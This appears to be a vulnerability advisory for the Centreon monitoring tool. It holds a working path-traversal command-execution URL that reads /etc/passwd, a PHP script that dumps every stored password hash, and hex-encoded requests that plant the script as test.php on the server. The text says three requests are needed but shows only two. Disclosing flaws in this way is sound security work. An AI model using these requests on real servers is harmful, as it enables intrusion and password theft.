Finding 1: Remote Command Execution

Centreon supervision and monitoring tool provided by Merethis permits
remote code execution from the command help web page allowing an
attacker to execute arbitrary commands in the context of the webserver
hosting the application. Any account that has been granted the access
to "Configuration > Nagios > Checks" is able to execute commands.

The following Proof of Concept (PoC) executes the command
'cat /etc/passwd':

http://example.domain/centreon/main.php?p=60706&command_name=/Centreon/SNMP/../../../../bin/cat%20/etc/passwd%20%23&o=h&min=1

Finding 2: One-Way Hash Without a Salt

The following code at lines 329-349 from
www/include/configuration/nconfigObject/contact/DB-Func.php
shows the insertContactInDB() function inserting the MD5 or SHA1
password hash in the database without using a salt:

    $rq = "INSERT INTO `contact` ( " .
            "`contact_id` , `timeperiod_tp_id` , `timeperiod_tp_id2` ,
            `contact_name` , " .  "`contact_alias` , `contact_autologin_key` ,
            `contact_passwd` , `contact_lang` , `contact_template_id`, " .
            "`contact_host_notification_options` ,
            `contact_service_notification_options` , " .  "`contact_email` ,
            `contact_pager` , `contact_comment` , `contact_oreon`,
            `contact_register`, `contact_enable_notifications` , " .
            "`contact_admin` , `contact_type_msg`, `contact_activate`,
            `contact_auth_type`, " .  "`contact_ldap_dn`, `contact_location`,
            `contact_address1`, `contact_address2`, " .  "`contact_address3`,
            `contact_address4`, `contact_address5`, `contact_address6`)" .
            "VALUES ( ";
    $rq .= "NULL, "; isset($ret["timeperiod_tp_id"]) && $ret["timeperiod_tp_id"]
    != NULL ? $rq .= "'".$ret["timeperiod_tp_id"]."', ": $rq .= "NULL, ";
    isset($ret["timeperiod_tp_id2"]) && $ret["timeperiod_tp_id2"] != NULL ? $rq
    .= "'".$ret["timeperiod_tp_id2"]."', ": $rq .= "NULL, ";
    isset($ret["contact_name"]) && $ret["contact_name"] != NULL ? $rq .=
    "'".htmlentities($ret["contact_name"], ENT_QUOTES, "UTF-8")."', ": $rq .=
    "NULL, ";---isset($ret["contact_alias"]) && $ret["contact_alias"] != NULL ?
    $rq .= "'".htmlentities($ret["contact_alias"], ENT_QUOTES, "UTF-8")."', ":
    $rq .= "NULL, "; isset($ret["contact_autologin_key"]) &&
    $ret["contact_autologin_key"] != NULL ? $rq .=
    "'".htmlentities($ret["contact_autologin_key"], ENT_QUOTES)."', ": $rq .=
    "NULL, "; if ($encryptType == 1)
        isset($ret["contact_passwd"]) && $ret["contact_passwd"] != NULL ? $rq .=
        "'".md5($ret["contact_passwd"])."', ": $rq .= "NULL, ";
    else if ($encryptType == 2)
        isset($ret["contact_passwd"]) && $ret["contact_passwd"] != NULL ? $rq .=
        "'".sha1($ret["contact_passwd"])."', ": $rq .= "NULL, ";
    else
        isset($ret["contact_passwd"]) && $ret["contact_passwd"] != NULL ? $rq .=
        "'".md5($ret["contact_passwd"])."', ": $rq .= "NULL, ";


The combination of unsalted hashes and Finding 1 allows an attacker to
recover passwords for all accounts. The following example illustrates
this attack.

The following php code will dump the hashes of all users:

<?php require_once ("/etc/centreon/centreon.conf.php"); require_once "$classdir/centreonDB.class.php"; $p=new CentreonDB(); $r=$p->query("SELECT contact_passwd from centreon.contact"); while ($w=&$r->fetchRow()) {echo $w["contact_passwd"] . "<br>";} ?>

To upload and execute this code on the server, one method is to convert
the above php code to hexadecimal and use the remote code execution
method outlined in Finding 1 to create a server-side php file. The
length of the URL accepted in this case is limited, so the file must
be broken into three parts. The following requests create the php
file "test.php":

http://example.domain/centreon/main.php?p=60706&command_name=/Centreon/SNMP/../../../../usr/bin/printf%20\\x3c\\x3f\\x70\\x68\\x70\\x20\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x5f\\x6f\\x6e\\x63\\x65\\x20\\x28\\x22\\x2f\\x65\\x74\\x63\\x2f\\x63\\x65\\x6e\\x74\\x72\\x65\\x6f\\x6e\\x2f\\x63\\x65\\x6e\\x74\\x72\\x65\\x6f\\x6e\\x2e\\x63\\x6f\\x6e\\x66\\x2e\\x70\\x68\\x70\\x22\\x29\\x3b\\x20\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x5f\\x6f\\x6e\\x63\\x65\\x20\\x22\\x24\\x63\\x6c\\x61\\x73\\x73\\x64\\x69\\x72\\x2f\\x63\\x65\\x6e\\x74%20|tee%20-a%20test.php%20%23&o=h&min=1

http://example.domain/centreon/main.php?p=60706&command_name=/Centreon/SNMP/../../../../usr/bin/printf%20\\x74\\x72\\x65\\x6f\\x6e\\x2e\\x63\\x6f\\x6e\\x74\\x61\\x63\\x74\\x22\\x29\\x3b\\x20\\x77\\x68\\x69\\x6c\\x65\\x20\\x28\\x24\\x77\\x3d\\x26\\x24\\x72\\x2d\\x3e\\x66\\x65\\x74\\x63\\x68\\x52\\x6f\\x77\\x28\\x29\\x29\\x20\\x7b\\x65\\x63\\x68\\x6f\\x20\\x24\\x77\\x5b\\x22\\x63\\x6f\\x6e\\x74\\x61\\x63\\x74\\x5f\\x70\\x61\\x73\\x73\\x77\\x64\\x22\\x5d\\x20\\x2e\\x20\\x22\\x3c\\x62\\x72\\x3e\\x22\\x3b\\x7d\\x20\\x3f\\x3e%20|tee%20-a%20test.php%20%23&o=h&min=1

Execution of http://example.domain/centreon/test.php will provide
the unsalted hashes. Using rainbow tables, these passwords can be
reversed, the time and size of rainbow table required dependent on
the complexity of the passwords involved.
